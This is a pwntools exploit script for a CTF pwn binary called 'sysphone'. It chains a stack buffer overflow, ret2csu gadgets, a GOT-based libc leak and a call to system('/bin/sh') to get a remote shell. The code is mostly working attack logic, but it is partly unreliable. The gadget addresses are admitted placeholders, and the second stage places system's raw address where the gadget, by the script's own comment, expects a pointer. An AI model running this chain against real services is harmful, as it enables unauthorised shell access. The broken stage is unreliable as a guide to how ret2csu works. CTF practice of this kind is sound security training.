#!/usr/bin/env python3
from pwn import *

# =============================================================================
# --- Exploit Configuration ---
# =============================================================================

context.update(arch='amd64', os='linux')

HOST = "ctf.compfest.id"
PORT = 7003
USE_GDB = args.GDB
BINARY_NAME = './sysphone'

# --- Addresses and Offset ---
# The buffer is at [rbp-0x100]. The return address is at [rbp+8].
# The offset is 0x100 + 8 = 264.
OFFSET = 264

# --- Binary Specific Addresses (YOU MUST FIND THESE) ---
try:
    elf = context.binary = ELF(BINARY_NAME, checksec=False)
    # Confirmed from previous steps
    PUTS_PLT = elf.plt['puts']
    PUTS_GOT = elf.got['puts']
    MAIN_ADDR = elf.symbols['main']
    RET = ROP(elf).find_gadget(['ret'])[0]
    
    # --- Return-to-CSU Gadget Addresses (PLACEHOLDERS) ---
    # Find these using `objdump -d ./sysphone` inside `__libc_csu_init`.
    # This function was not in your .text dump; it's likely in the .init section.
    CSU_POP_GADGET = 0x00000000004013da # CRITICAL: Replace with real address from __libc_csu_init
    CSU_MOV_GADGET = 0x00000000004013ba # CRITICAL: Replace with real address from __libc_csu_init

except (FileNotFoundError, AttributeError, TypeError):
    log.warning("Binary not found or values missing. Using hardcoded addresses.")
    log.warning("You MUST find and verify the CSU_GADGET addresses!")
    
    # --- Confirmed Addresses ---
    RET = 0x000000000040101a
    PUTS_PLT = 0x401030
    PUTS_GOT = 0x403fb8
    MAIN_ADDR = 0x000000000040138e

    # --- Return-to-CSU Gadget Addresses (PLACEHOLDERS) ---
    # The __libc_csu_init function was not in the .text section dump.
    # You MUST find it (likely in the .init section) and get the correct addresses.
    # These are placeholder values from a typical binary.
    CSU_POP_GADGET = 0x00000000004013da # CRITICAL: Replace with real address of "pop rbx; pop rbp; ..."
    CSU_MOV_GADGET = 0x00000000004013ba # CRITICAL: Replace with real address of "mov rdx, r14; ..."

# =============================================================================
# --- Exploit Logic ---
# =============================================================================

def connect():
    """Establish the connection to the target."""
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        p = process(BINARY_NAME)
        if USE_GDB:
            gdb.attach(p, gdbscript='''
                # Break after the first payload is sent
                b *vuln+121
                c
            ''')
        return p

def check_bad_bytes(payload):
    """The custom fgets exits if it sees the sequence 0x0f05."""
    if b'\x0f\x05' in payload:
        log.error("Payload contains the bad byte sequence 0x0f 0x05!")
        return True
    return False

def csu_call(func_to_call_got, rdi=0, rsi=0, rdx=0):
    """
    Builds a ROP chain using the __libc_csu_init gadgets to call a function.
    - func_to_call_got: The address in the GOT of the function to call (e.g., puts@got).
    - rdi, rsi, rdx: The values for the first three arguments.
    """
    # This chain first pops values into registers rbx through r15.
    # It then jumps to the second gadget which moves r13, r14, r15 into rdi, rsi, rdx
    # and calls the function pointer at [r12 + rbx*8].
    payload = p64(CSU_POP_GADGET) # 1. Start with the pop gadget
    payload += p64(0)             # rbx: Must be 0 so [r12 + rbx*8] is just [r12]
    payload += p64(1)             # rbp: Must be 1 to pass the 'cmp rbp, rbx' and not loop
    payload += p64(func_to_call_got) # r12: The address of the function to call from the GOT
    payload += p64(rdi)           # r13 -> becomes rdi
    payload += p64(rsi)           # r14 -> becomes rsi
    payload += p64(rdx)           # r15 -> becomes rdx
    payload += p64(CSU_MOV_GADGET) # 2. Jump to the mov/call gadget
    # After the call, the chain continues. We add 56 bytes of junk because
    # the pop gadget popped 7 qwords (56 bytes) after the ret address.
    payload += b'A' * 56
    return payload

def get_leak(p):
    """Builds and sends the first payload to leak a libc address."""
    if CSU_POP_GADGET == 0x0 or CSU_MOV_GADGET == 0x0:
        log.error("CSU Gadget addresses are not set. Cannot proceed.")
        return None

    log.info("Crafting payload 1: Leak libc address using ret2csu")
    
    # We want to call puts(puts@got)
    # rdi = puts@got
    rop_chain = csu_call(PUTS_GOT, rdi=PUTS_GOT)

    payload = b'A' * OFFSET
    payload += rop_chain
    payload += p64(MAIN_ADDR) # Return to main for the second stage

    if check_bad_bytes(payload): return None

    p.sendlineafter(b'length: ', str(len(payload)).encode())
    p.sendlineafter(b'data: ', payload)

    log.info("Payload 1 sent. Receiving leak...")
    p.recvuntil(b'js overflow me gng\n')
    leaked_bytes = p.recvline().strip()
    leaked_addr = u64(leaked_bytes.ljust(8, b'\x00'))
    
    log.success(f"Leaked puts@libc address: {hex(leaked_addr)}")
    return leaked_addr

def get_shell(p, libc_leak):
    """Builds and sends the second payload to pop a shell."""
    log.info("Crafting payload 2: Get a shell using ret2csu")
    
    # The binary uses GLIBC_2.34. Using offsets from libc.blukat.me
    # You should verify these against the leaked address.
    LIBC_PUTS_OFFSET = 0x075e10
    LIBC_SYSTEM_OFFSET = 0x04a320
    LIBC_BINSH_OFFSET = 0x1925bd

    libc_base = libc_leak - LIBC_PUTS_OFFSET
    system_addr = libc_base + LIBC_SYSTEM_OFFSET
    bin_sh_addr = libc_base + LIBC_BINSH_OFFSET

    log.info(f"Calculated libc base address: {hex(libc_base)}")
    log.info(f"Calculated system() address: {hex(system_addr)}")
    log.info(f"Calculated '/bin/sh' address: {hex(bin_sh_addr)}")

    # We want to call system("/bin/sh")
    # This time we call the real system address, not a GOT entry.
    # We can't use csu_call directly because it calls from the GOT.
    # So we build a similar chain but put the actual system_addr in r12.
    # The `leave; ret` at the end of `vuln` will clean up the stack.
    payload2 = b'A' * OFFSET
    payload2 += p64(CSU_POP_GADGET)
    payload2 += p64(0)              # rbx
    payload2 += p64(1)              # rbp
    payload2 += p64(system_addr)    # r12: The *actual address* of system in libc
    payload2 += p64(bin_sh_addr)    # r13 -> rdi
    payload2 += p64(0)              # r14 -> rsi
    payload2 += p64(0)              # r15 -> rdx
    payload2 += p64(CSU_MOV_GADGET)

    if check_bad_bytes(payload2): return

    p.sendlineafter(b'length: ', str(len(payload2)).encode())
    p.sendlineafter(b'data: ', payload2)
    log.success("Payload 2 sent. Enjoy your shell!")

def main():
    """Main exploit function."""
    p = connect()
    leaked_puts = get_leak(p)
    if leaked_puts:
        get_shell(p, leaked_puts)
        p.interactive()

if __name__ == "__main__":
    main()
